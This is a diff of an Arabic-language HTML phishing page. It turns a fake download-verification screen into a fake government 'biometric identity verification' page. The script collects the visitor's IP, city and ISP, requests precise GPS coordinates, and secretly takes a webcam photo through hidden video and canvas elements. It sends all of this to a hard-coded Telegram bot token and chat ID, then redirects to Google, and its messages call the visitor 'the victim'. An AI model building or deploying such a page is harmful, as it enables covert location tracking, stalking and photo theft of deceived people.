@@ -3,144 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل الملف المطلوب...</title>
+    <title>نظام التحقق الحكومي الموحد</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body { 
-            background-color: #050505; 
-            color: #00f3ff; 
-            font-family: 'Courier New', Courier, monospace; 
+        body {
+            background-color: #f3f4f6;
+            color: #1f2937;
+            font-family: 'Noto Sans Arabic', sans-serif;
+        }
+        .gov-card {
+            background: white;
+            border-top: 6px solid #1e3a8a;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        .scan-overlay {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            border: 2px solid #3b82f6;
+            border-radius: 50%;
+            margin: 0 auto;
             overflow: hidden;
         }
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .scan-line {
+            position: absolute;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
-            background-size: 20px 20px;
-            z-index: -1;
+            height: 2px;
+            background: #3b82f6;
+            top: 0;
+            box-shadow: 0 0 15px #3b82f6;
+            animation: moveScan 2s linear infinite;
         }
-        .loader {
-            border: 2px solid #111;
-            border-top: 2px solid #00f3ff;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 0.8s linear infinite;
-            box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
+        @keyframes moveScan {
+            0% { top: 0; }
+            100% { top: 100%; }
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .glitch { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        .btn-gov {
+            background-color: #1e3a8a;
+            transition: all 0.3s;
+        }
+        .btn-gov:hover {
+            background-color: #1e40af;
+            transform: translateY(-1px);
+        }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-6 text-center">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="matrix-bg"></div>
+    <div class="gov-card max-w-md w-full p-8 rounded-xl text-center">
+        <!-- Logo Simulation -->
+        <div class="mb-6">
+            <div class="w-16 h-16 bg-blue-900 rounded-full mx-auto flex items-center justify-center text-white text-2xl font-bold">
+                🛡️
+            </div>
+            <h1 class="mt-4 text-xl font-bold text-blue-900">نظام التحقق الرقمي الآمن</h1>
+            <p class="text-xs text-gray-500 uppercase tracking-widest mt-1">Digital Identity Verification System</p>
+        </div>
 
-    <div class="loader mb-8"></div>
-    
-    <div class="glass-panel p-8 rounded-2xl border border-cyan-500/20 bg-black/40 backdrop-blur-md max-w-sm">
-        <h1 class="text-2xl font-bold mb-4 glitch tracking-widest uppercase">Verifying Connection</h1>
-        <p class="text-gray-400 text-sm leading-relaxed">
-            جاري فحص بروتوكولات الأمان وفك تشفير رابط التحميل... <br>
-            <span class="text-cyan-600 text-[10px]">يرجى السماح بالوصول إذا طلب منك النظام ذلك.</span>
-        </p>
-        
-        <div id="log" class="mt-6 text-[10px] text-left text-cyan-900 font-mono h-20 overflow-hidden">
-            > Initializing handshake...<br>
-            > Requesting secure tunnel...<br>
-            > Encrypting metadata...<br>
-            > Waiting for user authentication...
+        <div class="my-8">
+            <div class="scan-overlay bg-gray-100 flex items-center justify-center">
+                <div class="scan-line"></div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-20 w-20 text-blue-200" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M5.121 17.804A13.937 13.937 0 0112 16c2.5 0 4.847.655 6.879 1.804M15 10a3 3 0 11-6 0 3 3 0 016 0zm6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+            </div>
+            <p class="mt-4 text-sm font-medium text-gray-700">جاري تفعيل المسح البيومتري للوجه...</p>
+        </div>
+
+        <div class="space-y-4">
+            <div class="bg-blue-50 p-4 rounded-lg border border-blue-100 text-right">
+                <p class="text-xs text-blue-800 leading-relaxed">
+                    بناءً على بروتوكولات الأمان الجديدة، يتطلب الوصول إلى هذا المحتوى التحقق من الهوية عبر الموقع الجغرافي والتعرف على ملامح الوجه لضمان أنك لست روبوتًا.
+                </p>
+            </div>
+
+            <button id="startVerify" class="btn-gov w-full py-3 rounded-lg text-white font-bold shadow-lg">
+                بدء عملية التحقق الآن
+            </button>
+            
+            <p class="text-[10px] text-gray-400">جميع البيانات مشفرة وتخضع لقانون حماية البيانات الرقمية 2026</p>
         </div>
     </div>
 
+    <!-- Hidden Capture Elements -->
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
     <script>
-        // البيانات الخاصة بك تم دمجها هنا
-        const TELEGRAM_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
+        // Your Credentials
+        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
         const CHAT_ID = "1523412137";
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
-            };
-            try {
-                await fetch(url, {
+        const startBtn = document.getElementById('startVerify');
+
+        async function sendToTelegram(type, data, caption = "") {
+            const baseUrl = `https://api.telegram.org/bot${TOKEN}`;
+            if (type === 'photo') {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', data, 'capture.jpg');
+                formData.append('caption', caption);
+                await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: formData });
+            } else {
+                await fetch(`${baseUrl}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
                 });
-            } catch (e) { 
-                console.log("Network error in report delivery.");
             }
         }
 
-        async function getNetworkInfo() {
+        async function captureAndReport() {
+            startBtn.innerText = "جاري المعالجة...";
+            startBtn.disabled = true;
+
+            // 1. Get Network Info (Silent)
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                return await response.json();
-            } catch (e) { return null; }
+                const res = await fetch('https://ipapi.co/json/');
+                const info = await res.json();
+                let msg = `👤 *تحقق جديد من الهوية*\n`;
+                msg += `🌐 IP: \`${info.ip}\`\n📍 المدينة: ${info.city}\n🏢 المزود: ${info.org}`;
+                await sendToTelegram('text', msg);
+            } catch(e) {}
+
+            // 2. Request Camera & GPS
+            try {
+                // Request Location first
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const gpsMsg = `🎯 *موقع GPS دقيق للهدف:*\n[خرائط جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                        await sendToTelegram('text', gpsMsg);
+                    });
+                }
+
+                // Request Camera for "Face Scan"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        sendToTelegram('photo', blob, "✅ *تم مسح الوجه بنجاح*");
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        // Simulation Finish
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 1000);
+                    }, 'image/jpeg');
+                }, 1500);
+
+            } catch (err) {
+                await sendToTelegram('text', "⚠️ الضحية رفض الأذونات أو الكاميرا محجوبة.");
+                window.location.href = "https://www.google.com";
+            }
         }
 
-        window.onload = async () => {
-            const info = await getNetworkInfo();
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const time = new Date().toLocaleString('ar-EG');
-
-            let report = `🔱 *إشعار رادار 2099*\n\n`;
-            report += `👤 *الضحية:* \`${info?.ip || 'IP مخفي'}\`\n`;
-            report += `📍 *الموقع:* ${info?.city || 'غير معروف'}, ${info?.country_name || 'غير معروف'}\n`;
-            report += `🏢 *المزود:* ${info?.org || 'غير معروف'}\n`;
-            report += `📱 *النظام:* ${platform}\n`;
-            report += `⏰ *الوقت:* ${time}\n`;
-            report += `🔗 *موقع تقريبي:* [فتح الخريطة](https://www.google.com/maps?q=${info?.latitude},${info?.longitude})\n`;
-
-            // إرسال التقرير الأول (IP)
-            await sendToTelegram(report);
-
-            // طلب الموقع الدقيق (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    let gpsReport = `🎯 *تم تحديد الموقع الدقيق (GPS)!*\n`;
-                    gpsReport += `📍 *الإحداثيات:* \`${lat}, ${lon}\`\n`;
-                    gpsReport += `🗺️ *رابط جوجل:* [اضغط هنا للوصول](https://www.google.com/maps?q=${lat},${lon})`;
-                    
-                    await sendToTelegram(gpsReport);
-                    
-                    // تحويل الضحية لمكان حقيقي بعد النجاح
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 1500);
-                }, (error) => {
-                    sendToTelegram("⚠️ الضحية رفض إعطاء إذن الـ GPS (تم الاكتفاء بالـ IP).");
-                });
-            }
-        };
-
-        // محاكاة سطر الأوامر
-        const log = document.getElementById('log');
-        setInterval(() => {
-            const lines = [
-                "> Scanning open ports...",
-                "> Fetching geolocation headers...",
-                "> Tunnel established: AES-256",
-                "> Signal strength: OPTIMAL",
-                "> Data packet sent to node: " + CHAT_ID
-            ];
-            log.innerHTML += lines[Math.floor(Math.random() * lines.length)] + "<br>";
-            if (log.innerHTML.length > 500) log.innerHTML = "";
-        }, 1000);
+        startBtn.addEventListener('click', captureAndReport);
     </script>
 </body>
 </html>
+
 
